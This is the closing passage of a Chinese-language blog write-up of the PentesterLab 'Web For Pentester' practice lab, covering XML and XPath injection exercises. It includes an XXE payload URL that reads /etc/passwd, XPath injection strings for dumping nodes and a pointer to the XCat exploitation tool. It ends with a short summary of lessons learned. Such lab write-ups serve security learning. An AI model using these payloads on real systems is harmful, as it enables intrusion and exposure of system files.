<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xml/example1.php?xml=<span class="meta">&lt;!DOCTYPE+foo+[+&lt;!ENTITY+xxe+SYSTEM+&quot;file%3a///etc/passwd&quot;&gt;+]&gt;</span><span class="tag">&lt;<span class="name">test</span>&gt;</span>%26xxe%3b<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="XML-Example-2"><a href="#XML-Example-2" class="headerlink" title="XML Example 2"></a>XML Example 2</h4><p>&#x5355;&#x5F15;&#x53F7;&#x62A5;&#x9519;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x6570;&#x636E;&#x8FD8;&#x662F;&#x7ECF;&#x8FC7; <code>SimpleXMLElement</code> &#x5904;&#x7406;</p>
<p>&#x6CE8;&#x610F;&#x5230;&#x53EA;&#x6709;&#x5F53; <code>$name=hacker</code> &#x65F6;&#x9875;&#x9762;&#x6B63;&#x5E38;&#x56DE;&#x663E;&#xFF0C;<del>&#x96BE;&#x9053; <code>$name</code> &#x503C;&#x63D2;&#x5230;&#x6807;&#x7B7E;&#x91CC;&#x9762;&#x4E86;</del></p>
<p>&#x53C8;&#x65AD;&#x601D;&#x8DEF;&#x4E86;&#x3002;&#x3002;&#x7785;&#x6E90;&#x7801;&#x53BB;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_9_1.png" alt="image-20200310192246681"></p>
<p>XPATH &#x6CE8;&#x5165;&#x3002;&#x3002;&#x5229;&#x7528;&#x548C; SQL &#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x76F8;&#x4F3C;</p>
<p>&#x4F7F;&#x7528; <code>&apos;or &apos;1</code> &#x904D;&#x5386; <code>&lt;name&gt;</code> &#x8282;&#x70B9;</p>
<p>&#x4F7F;&#x7528; <code>&apos;] | //* | //*[&apos;</code> &#x8FDB;&#x884C;&#x8282;&#x70B9;&#x904D;&#x5386;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/xml/example2.php?name=a%27]+|+//*+|+//*[%27</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E00;&#x6B3E; XPath &#x76F2;&#x6CE8;&#x5DE5;&#x5177;&#x5FEB;&#x901F;&#x68C0;&#x7D22;&#x5B8C;&#x6574;&#x7684; XML &#x6587;&#x6863;&#xFF0C;&#x7279;&#x5B9A;&#x60C5;&#x51B5;&#x4E0B;&#x8FD8;&#x53EF;&#x4EE5;&#x68C0;&#x7D22;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x548C;&#x5176;&#x5B83;&#x4FE1;&#x606F;</p>
<blockquote>
<p><a href="https://github.com/orf/xcat" target="_blank" rel="noopener">XCat</a>&#xFF1A;</p>
<p>xcat is an advanced tool for exploiting XPath injection vulnerabilities, featuring a comprehensive set of features to read the entire file being queried as well as other files on the filesystem, environment variables and directories</p>
</blockquote>
<p>&#x6548;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p>
<p><img src="/2020/03/10/Pentesterlab-Web-For-Pentester/2_9_2.png" alt="image-20200310212131864"></p>
<h2 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h2><p>&#x6574;&#x4F53;&#x6765;&#x770B;&#x6BD4;&#x8F83;&#x5E38;&#x89C4;&#xFF0C;&#x5370;&#x8C61;&#x8F83;&#x6DF1;&#x7684;&#x51E0;&#x4E2A;&#x70B9;&#xFF1A;</p>
<ul>
<li>order by &#x8BED;&#x53E5;&#x540E;&#x5217;&#x540D;&#x7684;&#x53CD;&#x5F15;&#x53F7;&#xFF08;``&#xFF09;&#x5305;&#x88F9;</li>
<li>LDAP Attack &#x626B;&#x76F2;</li>
<li>XPath &#x7684;&#x76F2;&#x6CE8;</li>
</ul>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>c0r1</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://www.c0r1.com/2020/03/10/Pentesterlab-Web-For-Pentester/">http://www.c0r1.com/2020/03/10/Pentesterlab-Web-For-Pentester/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/é¶æº/"># é¶æº</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2019/12/05/Web-å¯ç å­¦æ»å»/">Web å¯ç å­¦æ»å»</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>Â© c0r1 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
